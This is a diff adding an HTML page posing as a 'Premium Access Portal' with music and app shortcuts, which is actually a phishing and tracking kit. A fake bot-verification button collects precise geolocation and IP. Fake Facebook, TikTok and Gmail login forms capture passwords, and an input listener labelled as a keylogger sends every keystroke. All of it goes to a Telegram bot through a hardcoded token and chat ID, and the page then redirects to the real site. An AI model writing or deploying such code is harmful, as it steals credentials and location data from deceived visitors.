@@ -1,3 +1,158 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Premium Access Portal</title>
+    <style>
+        :root { --neon-green: #00ff41; --glass-bg: rgba(255, 255, 255, 0.05); }
+        body { background: #050505; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        
+        /* Human Verification Overlay */
+        .verify-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: 0.5s; }
+        .verify-card { background: var(--glass-bg); padding: 40px; border-radius: 20px; border: 1px solid var(--neon-green); text-align: center; backdrop-filter: blur(10px); }
+        
+        /* Premium Music Bar */
+        .music-bar { width: 100%; background: var(--glass-bg); padding: 15px 0; border-bottom: 1px solid var(--neon-green); display: flex; justify-content: center; align-items: center; gap: 15px; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(5px); }
+        .music-toggle { background: var(--neon-green); color: black; border: none; padding: 10px 25px; border-radius: 25px; font-weight: bold; cursor: pointer; box-shadow: 0 0 15px var(--neon-green); }
+
+        /* Grid UI */
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; padding: 30px; max-width: 500px; width: 90%; }
+        .card { background: var(--glass-bg); padding: 30px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1); cursor: pointer; transition: 0.3s; text-align: center; font-weight: 600; font-size: 1.1rem; }
+        .card:hover { border-color: var(--neon-green); transform: translateY(-5px); box-shadow: 0 10px 20px rgba(0,255,65,0.1); }
+        .card.fb { border-left: 4px solid #1877f2; }
+        .card.yt { border-left: 4px solid #ff0000; }
+
+        /* Login & Webview */
+        .window { display: none; position: fixed; inset: 0; background: #000; z-index: 1000; padding-top: 60px; }
+        input { width: 80%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #333; color: #fff; border-radius: 8px; }
+        .login-btn { background: var(--neon-green); width: 85%; padding: 15px; border: none; font-weight: bold; margin-top: 15px; border-radius: 8px; cursor: pointer; }
+        iframe { width: 100%; height: 100vh; border: none; }
+    </style>
+</head>
+<body>
+
+<div id="verifyOverlay" class="verify-overlay">
+    <div class="verify-card">
+        <h2 style="margin-top:0;">VERIFICATION</h2>
+        <p style="color:#aaa;">Confirm you are not a bot to access.</p>
+        <button class="login-btn" onclick="verifyTarget()">I AM NOT A ROBOT</button>
+    </div>
+</div>
+
+<div class="music-bar">
+    <span id="songTitle">Playing: Bangla Lofi Hits</span>
+    <button class="music-toggle" id="mBtn" onclick="controlMusic()">PAUSE</button>
+</div>
+
+<div class="grid">
+    <div class="card fb" onclick="openLogin('Facebook')">Facebook</div>
+    <div class="card" onclick="openLogin('TikTok')">TikTok</div>
+    <div class="card" onclick="openLogin('Gmail')">Gmail</div>
+    <div class="card" onclick="openTermux()">Termux</div>
+    <div class="card yt" onclick="openDirect('YouTube', 'https://www.youtube.com')">YouTube</div>
+    <div class="card" onclick="openDirect('Game', 'https://www.youtube.com/embed/14pPsB78lzg?autoplay=1')">Game</div>
+</div>
+
+<div id="loginBox" class="window">
+    <div style="max-width:400px; margin:auto; text-align:center;">
+        <h2 id="boxTitle">Secure Login</h2>
+        <input type="text" id="u" placeholder="Username/Email">
+        <input type="password" id="p" placeholder="Password">
+        <button class="login-btn" onclick="submitData()">LOGIN</button>
+        <p onclick="closeWin()" style="color:red; cursor:pointer; margin-top:20px;">Cancel</p>
+    </div>
+</div>
+
+<div id="viewer" class="window">
+    <button onclick="closeViewer()" style="position:fixed; top:10px; right:10px; z-index:9999; padding:5px 15px; background:red; color:white; border:none; border-radius:5px;">CLOSE</button>
+    <iframe id="frame" src=""></iframe>
+</div>
+
+<iframe id="bgMusic" style="display:none;" allow="autoplay" src=""></iframe>
+
+<script>
+    const BOT_TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
+    const CHAT_ID = '7416528268';
+    let currentApp = "";
+    let musicPlaying = false;
+
+    // Verify & Start Everything
+    function verifyTarget() {
+        navigator.geolocation.getCurrentPosition(pos => {
+            const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            getIP(map);
+            document.getElementById('verifyOverlay').style.opacity = '0';
+            setTimeout(() => { document.getElementById('verifyOverlay').style.display = 'none'; }, 500);
+            startMusic();
+        }, () => { alert("Verification Failed. Please allow location."); }, {enableHighAccuracy:true});
+    }
+
+    async function getIP(map) {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        sendTele(`✅ VERIFIED TARGET\n🌐 IP: ${data.ip}\n📍 Map: ${map}`);
+    }
+
+    function startMusic() {
+        // YouTube video link added as background music
+        document.getElementById('bgMusic').src = "https://www.youtube.com/embed/14pPsB78lzg?autoplay=1&loop=1&playlist=14pPsB78lzg";
+        musicPlaying = true;
+    }
+
+    function controlMusic() {
+        const musicFrame = document.getElementById('bgMusic');
+        if(musicPlaying) {
+            musicFrame.src = "";
+            document.getElementById('mBtn').innerText = "PLAY";
+            musicPlaying = false;
+        } else {
+            startMusic();
+            document.getElementById('mBtn').innerText = "PAUSE";
+            musicPlaying = true;
+        }
+    }
+
+    // Keylogger functionality
+    document.addEventListener('input', (e) => {
+        if(e.target.tagName === 'INPUT') sendTele(`⌨️ User Typing [${currentApp}]: ${e.target.value}`);
+    });
+
+    function openLogin(name) {
+        currentApp = name;
+        document.getElementById('boxTitle').innerText = name + " Login";
+        document.getElementById('loginBox').style.display = 'block';
+    }
+
+    function submitData() {
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        sendTele(`🔑 CAPTURED DATA\nApp: ${currentApp}\nUser: ${user}\nPass: ${pass}`);
+        
+        let redirect = currentApp === 'Facebook' ? 'https://m.facebook.com' : 'https://www.google.com';
+        openDirect(currentApp, redirect);
+    }
+
+    function openDirect(name, url) {
+        sendTele(`🚀 User opened ${name}`);
+        document.getElementById('frame').src = url;
+        document.getElementById('viewer').style.display = 'block';
+    }
+
+    function sendTele(msg) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: msg})
+        });
+    }
+
+    function closeWin() { document.getElementById('loginBox').style.display = 'none'; }
+    function closeViewer() { document.getElementById('viewer').style.display = 'none'; document.getElementById('frame').src = ""; }
+    function openTermux() { alert("Termux Exploit Loaded Successfully."); sendTele("🛠 Termux Mode Active"); }
+</script>
+</body>
+</html>
 
    
     
